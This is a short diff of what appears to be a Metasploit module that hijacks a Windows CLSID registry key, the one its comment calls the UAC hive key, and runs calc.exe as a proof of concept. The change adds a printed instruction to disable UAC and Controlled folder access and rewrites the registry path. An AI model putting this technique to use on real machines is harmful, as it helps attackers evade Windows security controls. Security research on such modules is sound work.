@@ -198,9 +198,10 @@ def run
       print_line("windows 10 version its protected againts this exploit.")
       print_line("-------------------------------------------------------")
       print_line("Disable 'Controlled folder access' in Windows Defender")
+      print_line("And disable also UAC from running (set never notify)")
       print_line("If you wish to teste this on windows 10 version distros")
       print_line("-------------------------------------------------------")
-      Rex::sleep(6.0)
+      Rex::sleep(7.0)
     end
 
 
@@ -209,7 +210,7 @@ def run
   hacks = []
   app_path = datastore['APPL_PATH']   # %windir%\\System32\\calc.exe
   fol_path = datastore['FOLDER_PATH'] # C:\\Users\%username%\Desktop\POC
-  hive_key = "HKCU\\Software\\Classes\\CLSID" # uac hive key (CLSID)
+  hive_key = "HKEY_CURRENT_USER\\Software\\Classes\\CLSID" # uac hive key (CLSID)
   #
   # check for proper config settings enter
   # to prevent 'unset all' from deleting default options ..
